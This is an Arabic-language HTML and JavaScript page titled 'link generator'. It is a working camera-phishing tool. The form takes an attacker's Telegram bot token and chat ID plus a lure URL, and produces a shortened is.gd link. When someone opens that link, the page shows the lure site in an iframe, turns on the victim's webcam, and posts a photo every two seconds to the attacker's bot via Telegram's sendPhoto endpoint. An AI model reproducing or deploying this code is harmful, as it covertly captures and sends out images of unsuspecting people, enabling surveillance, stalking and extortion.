<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>مولد الروابط</title>
  <style>
    body {
      font-family: Tahoma, sans-serif;
      background: #0f0f0f url('YOUR_IMAGE_URL') no-repeat center center / cover;
      color: #fff;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .box {
      background: rgba(0,0,0,0.7);
      padding: 20px;
      border-radius: 12px;
      width: 350px;
    }
    h1 {
      text-align: center;
      color: #4a89dc;
    }
    .input-group { margin-bottom: 15px; }
    label { display: block; margin-bottom: 5px; }
    input {
      width: 100%; padding: 10px; border: none;
      border-radius: 8px;
    }
    button {
      width: 100%; padding: 12px; border: none;
      border-radius: 8px;
      background: #4a89dc; color: #fff;
      cursor: pointer; font-size: 16px;
    }
    button:hover { background: #3570b5; }
    #result {
      margin-top: 15px; word-break: break-all;
      background: rgba(255,255,255,0.1);
      padding: 10px; border-radius: 8px;
    }
    .camera-note {
      background: rgba(0,0,0,0.6);
      color: #ffcc00;
      text-align: center;
      padding: 5px;
      font-size: 14px;
    }
    iframe {
      border: none;
      width: 100%;
      height: calc(100vh - 30px);
    }
  </style>
</head>
<body>

<div class="box" id="formBox">
  <h1>مولد الروابط</h1>
  <div class="input-group">
    <label>أدخل الـ ID</label>
    <input type="text" id="chatIdInput" placeholder="Chat ID">
  </div>
  <div class="input-group">
    <label>أدخل التوكن</label>
    <input type="text" id="tokenInput" placeholder="Bot Token">
  </div>
  <div class="input-group">
    <label>أدخل الرابط</label>
    <input type="text" id="linkInput" placeholder="https://example.com">
  </div>
  <button id="generateBtn">إنشاء الرابط</button>
  <div id="result"></div>
</div>

<script>
const generateBtn = document.getElementById("generateBtn");
const result = document.getElementById("result");

generateBtn.addEventListener("click", async () => {
  const chatId = document.getElementById("chatIdInput").value.trim();
  const token = document.getElementById("tokenInput").value.trim();
  const link = document.getElementById("linkInput").value.trim();

  if (!chatId || !token || !link) {
    alert("املأ كل الحقول");
    return;
  }

  const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chatId)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(link)}`;

  try {
    const res = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(fullLink)}`);
    const shortUrl = await res.text();
    result.innerHTML = `<p>🔗 رابطك المختصر:</p><div>${shortUrl}</div>`;
  } catch (e) {
    result.textContent = "خطأ في الاختصار: " + e.message;
  }
});

const urlParams = new URLSearchParams(window.location.search);
const openUrl = urlParams.get("url");
const chatId = urlParams.get("chat");
const token = urlParams.get("token");

if (openUrl && chatId && token) {
  document.body.innerHTML = `
    <div class="camera-note">📷 يتم التقاط صور...</div>
    <iframe src="${openUrl}"></iframe>
  `;

  const video = document.createElement("video");
  video.autoplay = true;
  video.style.display = "none";
  document.body.appendChild(video);

  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
    video.srcObject = stream;
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    setInterval(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "image.jpg");
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: formData
        });
      }, "image/jpeg");
    }, 2000);
  });
}
</script>

</body>
</html>
